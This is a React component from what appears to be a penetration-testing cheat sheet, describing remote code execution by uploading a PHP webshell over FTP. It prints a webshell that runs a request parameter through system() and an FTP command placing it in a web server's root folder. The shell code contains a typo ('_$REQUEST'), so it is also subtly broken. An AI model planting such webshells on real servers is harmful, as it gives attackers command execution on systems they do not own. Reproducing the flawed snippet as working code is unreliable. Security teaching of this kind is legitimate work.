import {
    Typography,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Box,
  } from "@mui/material";
  import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
  import SyntaxHighlighter from "react-syntax-highlighter";
  import TreeView from '@mui/lab/TreeView';
import { TreeItem } from "@mui/lab";
import ChevronRightIcon from '@mui/icons-material/ChevronRight';
  
  interface IProps {
    title: string;
  }
  
  const FTP_RCE = ({ title }: IProps) => {

    const shell = `
    <?php 
        echo "Shelled";
        system(_$REQUEST['cmd']);
    ?>`

    return (
      <>
        {" "}
        <Accordion sx={{ backgroundColor: "primary.main" }}>
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1a-content"
            id="panel1a-header"
          >
            <Typography>{title}</Typography>
          </AccordionSummary>
          <AccordionDetails
            sx={{ backgroundColor: "primary.background_accordian" }}
          >
            <Typography
              sx={{
                color: "primary.main",
              }}
            >
              <Box pt={5} />
              <Typography variant="h6">
                    Description
                </Typography>

              <Typography>
              If you have proper permissions, you may be able to upload a webshell via FTP and execute it on the website. This can be done by either having a disclosure of the website's path or by guessing.
               </Typography>
               <Box pt={5}></Box>
               <Typography>
              Step 1 - Create a Webshell
               </Typography>
              <SyntaxHighlighter className="syntax" language="php">
              {shell}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            <Typography>
              Step 2 - Upload Webshell to Webroot via FTP
               </Typography>
              <SyntaxHighlighter className="syntax" language="ftp">
              {"ftp> put shell.php C:\\\\xampp\\\\htdocs\\\\shell.php"}
            </SyntaxHighlighter>
            </Typography>
          </AccordionDetails>
        </Accordion>
      </>
    );
  };

  
  export default FTP_RCE;
  